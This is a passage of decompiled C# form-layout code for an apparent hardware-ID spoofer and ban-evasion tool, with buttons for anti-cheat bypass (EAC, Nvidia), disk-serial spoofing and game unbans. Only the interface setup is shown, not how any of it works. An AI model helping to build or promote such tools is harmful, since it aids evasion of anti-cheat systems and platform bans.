			this.m_bt.Location = new Point(223, 295);
			this.m_bt.Margin = new Padding(2);
			this.m_bt.Name = "siticoneLabel6";
			this.m_bt.Size = new Size(7, 15);
			this.m_bt.TabIndex = 75;
			this.m_bt.Text = "|";
			this.m_bs.BorderColor = Color.Purple;
			this.m_bs.BorderRadius = 4;
			this.m_bs.BorderThickness = 2;
			this.m_bs.CheckedState.Parent = this.m_bs;
			this.m_bs.CustomImages.Parent = this.m_bs;
			this.m_i.SetDecoration(this.m_bs, DecorationType.None);
			this.m_bs.FillColor = Color.FromArgb(26, 32, 54);
			this.m_bs.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_bs.ForeColor = Color.White;
			this.m_bs.HoveredState.Parent = this.m_bs;
			this.m_bs.Location = new Point(30, 154);
			this.m_bs.Name = "siticoneButton1";
			this.m_bs.PressedColor = Color.FromArgb(26, 32, 54);
			this.m_bs.ShadowDecoration.Parent = this.m_bs;
			this.m_bs.Size = new Size(117, 32);
			this.m_bs.TabIndex = 74;
			this.m_bs.Text = "Reset User Photo";
			this.m_bs.Click += br;
			this.m_bl.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_bl, DecorationType.None);
			this.m_bl.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 161);
			this.m_bl.ForeColor = Color.Purple;
			this.m_bl.Location = new Point(37, 201);
			this.m_bl.Margin = new Padding(2);
			this.m_bl.Name = "siticoneLabel10";
			this.m_bl.Size = new Size(66, 17);
			this.m_bl.TabIndex = 73;
			this.m_bl.Text = "Disk Name: ";
			this.m_bm.BorderColor = Color.WhiteSmoke;
			this.m_bm.BorderRadius = 3;
			this.m_bm.Cursor = Cursors.IBeam;
			this.m_i.SetDecoration(this.m_bm, DecorationType.None);
			this.m_bm.DefaultText = "C";
			this.m_bm.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.m_bm.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.m_bm.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.m_bm.DisabledState.Parent = this.m_bm;
			this.m_bm.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.m_bm.FillColor = Color.FromArgb(26, 32, 54);
			this.m_bm.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
			this.m_bm.FocusedState.Parent = this.m_bm;
			this.m_bm.ForeColor = Color.Purple;
			this.m_bm.HoveredState.BorderColor = Color.FromArgb(94, 148, 255);
			this.m_bm.HoveredState.Parent = this.m_bm;
			this.m_bm.Location = new Point(107, 196);
			this.m_bm.Margin = new Padding(4);
			this.m_bm.Name = "diskname";
			this.m_bm.PasswordChar = '\0';
			this.m_bm.PlaceholderText = "";
			this.m_bm.SelectedText = "";
			this.m_bm.ShadowDecoration.Parent = this.m_bm;
			this.m_bm.Size = new Size(26, 28);
			this.m_bm.TabIndex = 72;
			this.m_bm.TextAlign = HorizontalAlignment.Center;
			this.m_bg.BorderColor = Color.Purple;
			this.m_bg.BorderRadius = 4;
			this.m_bg.BorderThickness = 2;
			this.m_bg.CheckedState.Parent = this.m_bg;
			this.m_bg.CustomImages.Parent = this.m_bg;
			this.m_i.SetDecoration(this.m_bg, DecorationType.None);
			this.m_bg.FillColor = Color.FromArgb(26, 32, 54);
			this.m_bg.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_bg.ForeColor = Color.White;
			this.m_bg.HoveredState.Parent = this.m_bg;
			this.m_bg.Location = new Point(30, 115);
			this.m_bg.Name = "siticoneButton2";
			this.m_bg.PressedColor = Color.FromArgb(26, 32, 54);
			this.m_bg.ShadowDecoration.Parent = this.m_bg;
			this.m_bg.Size = new Size(117, 32);
			this.m_bg.TabIndex = 71;
			this.m_bg.Text = "Delete Credentials";
			this.m_bg.Click += bc;
			this.m_as.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_as, DecorationType.None);
			this.m_as.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_as.ForeColor = Color.Purple;
			this.m_as.Location = new Point(65, 34);
			this.m_as.Margin = new Padding(2);
			this.m_as.Name = "siticoneLabel7";
			this.m_as.Size = new Size(101, 15);
			this.m_as.TabIndex = 62;
			this.m_as.Text = "Customize Spoofer";
			this.m_i.SetDecoration(this.m_at, DecorationType.None);
			this.m_at.Image = LeanSoftware.Properties.Resources.kindpng_3933927;
			this.m_at.Location = new Point(11, 10);
			this.m_at.Name = "pictureBox3";
			this.m_at.Size = new Size(46, 35);
			this.m_at.SizeMode = PictureBoxSizeMode.Zoom;
			this.m_at.TabIndex = 25;
			this.m_at.TabStop = false;
			this.m_au.AutoSize = true;
			this.m_i.SetDecoration(this.m_au, DecorationType.None);
			this.m_au.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.m_au.ForeColor = Color.White;
			this.m_au.Location = new Point(60, 3);
			this.m_au.Name = "label4";
			this.m_au.Size = new Size(111, 32);
			this.m_au.TabIndex = 9;
			this.m_au.Text = "Settings";
			this.m_av.AutoSize = true;
			this.m_i.SetDecoration(this.m_av, DecorationType.None);
			this.m_av.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_av.ForeColor = Color.Fuchsia;
			this.m_av.Location = new Point(105, 7);
			this.m_av.Margin = new Padding(2, 0, 2, 0);
			this.m_av.Name = "label7";
			this.m_av.Size = new Size(13, 19);
			this.m_av.TabIndex = 74;
			this.m_av.Text = "|";
			this.m_ay.AutoSize = true;
			this.m_i.SetDecoration(this.m_ay, DecorationType.None);
			this.m_ay.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_ay.ForeColor = Color.White;
			this.m_ay.Location = new Point(119, 8);
			this.m_ay.Margin = new Padding(2, 0, 2, 0);
			this.m_ay.Name = "time";
			this.m_ay.Size = new Size(71, 19);
			this.m_ay.TabIndex = 75;
			this.m_ay.Text = "0:00:0000";
			this.m_az.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_az, DecorationType.None);
			this.m_az.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.m_az.ForeColor = Color.Purple;
			this.m_az.Location = new Point(53, 327);
			this.m_az.Margin = new Padding(2);
			this.m_az.Name = "siticoneLabel8";
			this.m_az.Size = new Size(99, 17);
			this.m_az.TabIndex = 40;
			this.m_az.Text = "discord.gg/unban";
			this.m_az.Click += ar;
			this.m_ba.BackColor = Color.Transparent;
			this.m_ba.Controls.Add(this.m_br);
			this.m_ba.Controls.Add(this.m_bq);
			this.m_ba.Controls.Add(this.m_bo);
			this.m_ba.Controls.Add(this.m_bj);
			this.m_ba.Controls.Add(this.m_bi);
			this.m_ba.Controls.Add(this.m_bh);
			this.m_ba.Controls.Add(this.m_be);
			this.m_ba.Controls.Add(this.m_bf);
			this.m_ba.Controls.Add(this.m_bb);
			this.m_ba.Controls.Add(this.m_bc);
			this.m_ba.Controls.Add(this.m_bd);
			this.m_i.SetDecoration(this.m_ba, DecorationType.None);
			this.m_ba.FillColor = Color.FromArgb(25, 30, 50);
			this.m_ba.Location = new Point(195, 34);
			this.m_ba.Name = "premiumpanel";
			this.m_ba.ShadowColor = Color.Black;
			this.m_ba.Size = new Size(455, 311);
			this.m_ba.TabIndex = 73;
			this.m_ba.Paint += aw;
			this.m_br.BorderColor = Color.Purple;
			this.m_br.BorderThickness = 1;
			this.m_br.CheckedState.Parent = this.m_br;
			this.m_br.CustomImages.Parent = this.m_br;
			this.m_i.SetDecoration(this.m_br, DecorationType.None);
			this.m_br.FillColor = Color.FromArgb(25, 30, 50);
			this.m_br.Font = new Font("Segoe UI", 9f);
			this.m_br.ForeColor = Color.Purple;
			this.m_br.HoveredState.Parent = this.m_br;
			this.m_br.Location = new Point(303, 223);
			this.m_br.Name = "premnew2";
			this.m_br.ShadowDecoration.Parent = this.m_br;
			this.m_br.Size = new Size(123, 29);
			this.m_br.TabIndex = 75;
			this.m_br.Text = "G Life Unban";
			this.m_br.Click += bp;
			this.m_bq.BorderColor = Color.Purple;
			this.m_bq.BorderThickness = 1;
			this.m_bq.CheckedState.Parent = this.m_bq;
			this.m_bq.CustomImages.Parent = this.m_bq;
			this.m_i.SetDecoration(this.m_bq, DecorationType.None);
			this.m_bq.FillColor = Color.FromArgb(25, 30, 50);
			this.m_bq.Font = new Font("Segoe UI", 9f);
			this.m_bq.ForeColor = Color.Purple;
			this.m_bq.HoveredState.Parent = this.m_bq;
			this.m_bq.Location = new Point(30, 223);
			this.m_bq.Name = "premnew1";
			this.m_bq.ShadowDecoration.Parent = this.m_bq;
			this.m_bq.Size = new Size(123, 29);
			this.m_bq.TabIndex = 74;
			this.m_bq.Text = "Nvidia Bypass";
			this.m_bq.Click += bo;
			this.m_bo.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_bo, DecorationType.None);
			this.m_bo.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_bo.ForeColor = Color.Fuchsia;
			this.m_bo.Location = new Point(107, 159);
			this.m_bo.Margin = new Padding(2);
			this.m_bo.Name = "paketo";
			this.m_bo.Size = new Size(229, 15);
			this.m_bo.TabIndex = 73;
			this.m_bo.Text = "You don't have access to premium options!";
			this.m_bj.BorderColor = Color.Purple;
			this.m_bj.BorderThickness = 1;
			this.m_bj.CheckedState.Parent = this.m_bj;
			this.m_bj.CustomImages.Parent = this.m_bj;
			this.m_i.SetDecoration(this.m_bj, DecorationType.None);
			this.m_bj.FillColor = Color.FromArgb(25, 30, 50);
			this.m_bj.Font = new Font("Segoe UI", 9f);
			this.m_bj.ForeColor = Color.Purple;
			this.m_bj.HoveredState.Parent = this.m_bj;
			this.m_bj.Location = new Point(25, 271);
			this.m_bj.Name = "prem6";
			this.m_bj.ShadowDecoration.Parent = this.m_bj;
			this.m_bj.Size = new Size(402, 29);
			this.m_bj.TabIndex = 72;
			this.m_bj.Text = "1 Click CFX Unban";
			this.m_bj.Click += bk;
			this.m_bi.BorderColor = Color.Purple;
			this.m_bi.BorderThickness = 1;
			this.m_bi.CheckedState.Parent = this.m_bi;
			this.m_bi.CustomImages.Parent = this.m_bi;
			this.m_i.SetDecoration(this.m_bi, DecorationType.None);
			this.m_bi.FillColor = Color.FromArgb(25, 30, 50);
			this.m_bi.Font = new Font("Segoe UI", 9f);
			this.m_bi.ForeColor = Color.Purple;
			this.m_bi.HoveredState.Parent = this.m_bi;
			this.m_bi.Location = new Point(307, 153);
			this.m_bi.Name = "prem4";
			this.m_bi.ShadowDecoration.Parent = this.m_bi;
			this.m_bi.Size = new Size(123, 29);
			this.m_bi.TabIndex = 71;
			this.m_bi.Text = "System Boost";
			this.m_bi.Click += bf;
			this.m_bh.BorderColor = Color.Purple;
			this.m_bh.BorderThickness = 1;
			this.m_bh.CheckedState.Parent = this.m_bh;
			this.m_bh.CustomImages.Parent = this.m_bh;
			this.m_i.SetDecoration(this.m_bh, DecorationType.None);
			this.m_bh.FillColor = Color.FromArgb(25, 30, 50);
			this.m_bh.Font = new Font("Segoe UI", 9f);
			this.m_bh.ForeColor = Color.Purple;
			this.m_bh.HoveredState.Parent = this.m_bh;
			this.m_bh.Location = new Point(30, 153);
			this.m_bh.Name = "prem3";
			this.m_bh.ShadowDecoration.Parent = this.m_bh;
			this.m_bh.Size = new Size(123, 29);
			this.m_bh.TabIndex = 70;
			this.m_bh.Text = "EAC Bypass";
			this.m_bh.Click += be;
			this.m_be.BorderColor = Color.Purple;
			this.m_be.BorderThickness = 1;
			this.m_be.CheckedState.Parent = this.m_be;
			this.m_be.CustomImages.Parent = this.m_be;
			this.m_i.SetDecoration(this.m_be, DecorationType.None);
			this.m_be.FillColor = Color.FromArgb(25, 30, 50);
			this.m_be.Font = new Font("Segoe UI", 9f);
			this.m_be.ForeColor = Color.Purple;
			this.m_be.HoveredState.Parent = this.m_be;
			this.m_be.Location = new Point(307, 77);
			this.m_be.Name = "prem2";
			this.m_be.ShadowDecoration.Parent = this.m_be;
			this.m_be.Size = new Size(120, 29);
			this.m_be.TabIndex = 69;
			this.m_be.Text = "NVME Disk Spoof";
			this.m_be.Click += av;
			this.m_bf.BorderColor = Color.Purple;
			this.m_bf.BorderThickness = 1;
			this.m_bf.CheckedState.Parent = this.m_bf;
			this.m_bf.CustomImages.Parent = this.m_bf;
			this.m_i.SetDecoration(this.m_bf, DecorationType.None);
			this.m_bf.FillColor = Color.FromArgb(25, 30, 50);
			this.m_bf.Font = new Font("Segoe UI", 9f);
			this.m_bf.ForeColor = Color.Purple;
			this.m_bf.HoveredState.Parent = this.m_bf;
			this.m_bf.Location = new Point(30, 82);
			this.m_bf.Name = "prem1";
			this.m_bf.ShadowDecoration.Parent = this.m_bf;
			this.m_bf.Size = new Size(123, 29);
			this.m_bf.TabIndex = 67;
			this.m_bf.Text = "Unlink All";
			this.m_bf.Click += ax;
			this.m_bb.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_bb, DecorationType.None);
			this.m_bb.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_bb.ForeColor = Color.Purple;
			this.m_bb.Location = new Point(68, 34);
			this.m_bb.Margin = new Padding(2);
			this.m_bb.Name = "siticoneLabel9";
			this.m_bb.Size = new Size(186, 15);
			this.m_bb.TabIndex = 62;
			this.m_bb.Text = "Custom Options for Premium Users";
			this.m_i.SetDecoration(this.m_bc, DecorationType.None);
			this.m_bc.Image = LeanSoftware.Properties.Resources.pngaaa_com_3790696;
			this.m_bc.Location = new Point(11, 10);
			this.m_bc.Name = "pictureBox5";
			this.m_bc.Size = new Size(46, 35);
			this.m_bc.SizeMode = PictureBoxSizeMode.Zoom;
			this.m_bc.TabIndex = 25;
			this.m_bc.TabStop = false;
			this.m_bd.AutoSize = true;
			this.m_i.SetDecoration(this.m_bd, DecorationType.None);
			this.m_bd.Font = new Font("Segoe UI Black", 18f, FontStyle.Bold);
			this.m_bd.ForeColor = Color.White;
			this.m_bd.Location = new Point(60, 6);
			this.m_bd.Name = "label6";
			this.m_bd.Size = new Size(221, 32);
			this.m_bd.TabIndex = 9;
			this.m_bd.Text = "Premium Options";
			this.m_bv.BackColor = Color.Transparent;
			this.m_i.SetDecoration(this.m_bv, DecorationType.None);
			this.m_bv.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m_bv.ForeColor = SystemColors.ButtonHighlight;
			this.m_bv.Location = new Point(663, 319);
			this.m_bv.Margin = new Padding(2);
			this.m_bv.Name = "usersng";
			this.m_bv.Size = new Size(44, 15);
			this.m_bv.TabIndex = 77;
			this.m_bv.Text = "usersng";
			this.m_bn.CheckedState.Parent = this.m_bn;
			this.m_bn.CustomImages.Parent = this.m_bn;
			this.m_i.SetDecoration(this.m_bn, DecorationType.None);
			this.m_bn.FillColor = Color.Transparent;
			this.m_bn.FillColor2 = Color.Transparent;
			this.m_bn.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.m_bn.ForeColor = Color.White;
			this.m_bn.HoveredState.Parent = this.m_bn;
			this.m_bn.Image = LeanSoftware.Properties.Resources.PngItem_2354504;
			this.m_bn.Location = new Point(18, 209);
			this.m_bn.Name = "siticoneGradientButton1";
			this.m_bn.ShadowDecoration.Parent = this.m_bn;
			this.m_bn.Size = new Size(168, 52);
			this.m_bn.TabIndex = 76;
			this.m_bn.Text = "Premium";
			this.m_bn.Click += bl;
			this.m_aa.CheckedState.Parent = this.m_aa;
			this.m_aa.CustomImages.Parent = this.m_aa;
			this.m_i.SetDecoration(this.m_aa, DecorationType.None);
			this.m_aa.FillColor = Color.Transparent;
			this.m_aa.FillColor2 = Color.Transparent;
			this.m_aa.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.m_aa.ForeColor = Color.White;
			this.m_aa.HoveredState.Parent = this.m_aa;
			this.m_aa.Image = LeanSoftware.Properties.Resources.game;
			this.m_aa.Location = new Point(18, 151);
			this.m_aa.Name = "siticoneGradientButton3";
			this.m_aa.ShadowDecoration.Parent = this.m_aa;
			this.m_aa.Size = new Size(169, 51);
			this.m_aa.TabIndex = 72;
			this.m_aa.Text = "Games";
			this.m_aa.Click += ac;
			this.m_ab.CheckedState.Parent = this.m_ab;
			this.m_ab.CustomImages.Parent = this.m_ab;
			this.m_i.SetDecoration(this.m_ab, DecorationType.None);
			this.m_ab.FillColor = Color.Transparent;
			this.m_ab.FillColor2 = Color.Transparent;
			this.m_ab.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.m_ab.ForeColor = Color.White;
			this.m_ab.HoveredState.Parent = this.m_ab;
			this.m_ab.Image = LeanSoftware.Properties.Resources.pngaaa_com_3790696;
			this.m_ab.Location = new Point(12, 93);
			this.m_ab.Name = "siticoneGradientButton2";
			this.m_ab.ShadowDecoration.Parent = this.m_ab;
			this.m_ab.Size = new Size(175, 52);
			this.m_ab.TabIndex = 71;
			this.m_ab.Text = "Spoofer";
			this.m_ab.Click += aa;
			this.m_ac.CheckedState.Parent = this.m_ac;
			this.m_ac.CustomImages.Parent = this.m_ac;
			this.m_i.SetDecoration(this.m_ac, DecorationType.None);
			this.m_ac.FillColor = Color.Transparent;
			this.m_ac.FillColor2 = Color.Transparent;
			this.m_ac.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.m_ac.ForeColor = Color.White;
			this.m_ac.HoveredState.Parent = this.m_ac;
			this.m_ac.Image = LeanSoftware.Properties.Resources.kindpng_3933927;
			this.m_ac.Location = new Point(11, 271);
			this.m_ac.Name = "siticoneGradientButton4";
			this.m_ac.ShadowDecoration.Parent = this.m_ac;
			this.m_ac.Size = new Size(175, 52);
			this.m_ac.TabIndex = 70;
			this.m_ac.Text = "Settings";
			this.m_ac.Click += ad;
			this.m_o.Enabled = true;
			this.m_o.Interval = 1;
			this.m_o.Tick += d;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			AutoValidate = AutoValidate.Disable;
			BackColor = Color.FromArgb(26, 32, 54);
			base.ClientSize = new Size(662, 352);
			base.Controls.Add(this.m_bv);
			base.Controls.Add(this.m_bn);
			base.Controls.Add(this.m_az);
			base.Controls.Add(this.m_ay);
			base.Controls.Add(this.m_av);
			base.Controls.Add(this.m_aa);
			base.Controls.Add(this.m_ab);
			base.Controls.Add(this.m_ac);
			base.Controls.Add(this.m_r);
			base.Controls.Add(this.m_k);
			base.Controls.Add(this.m_j);
			base.Controls.Add(this.m_h);
			base.Controls.Add(this.m_g);
			base.Controls.Add(this.m_ak);
			base.Controls.Add(this.m_ba);
			base.Controls.Add(this.m_u);
			base.Controls.Add(this.m_ar);
			this.m_i.SetDecoration(this, DecorationType.BottomMirror);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Main";
			base.Opacity = 0.85;
			base.StartPosition = FormStartPosition.CenterScreen;
			Text = "Lean Main";
			base.TransparencyKey = Color.Maroon;
			base.Load += b;
			this.m_r.ResumeLayout(performLayout: false);
			this.m_r.PerformLayout();
			((ISupportInitialize)this.m_s).EndInit();
			this.m_u.ResumeLayout(performLayout: false);
			this.m_u.PerformLayout();
			((ISupportInitialize)this.m_w).EndInit();
			this.m_ak.ResumeLayout(performLayout: false);
			this.m_ak.PerformLayout();
			((ISupportInitialize)this.m_am).EndInit();
			this.m_ar.ResumeLayout(performLayout: false);
			this.m_ar.PerformLayout();
			((ISupportInitialize)this.m_at).EndInit();
			this.m_ba.ResumeLayout(performLayout: false);
			this.m_ba.PerformLayout();
			((ISupportInitialize)this.m_bc).EndInit();
			((ISupportInitialize)this.m_q).EndInit();
			ResumeLayout(performLayout: false);
			PerformLayout();
		}
	}
}
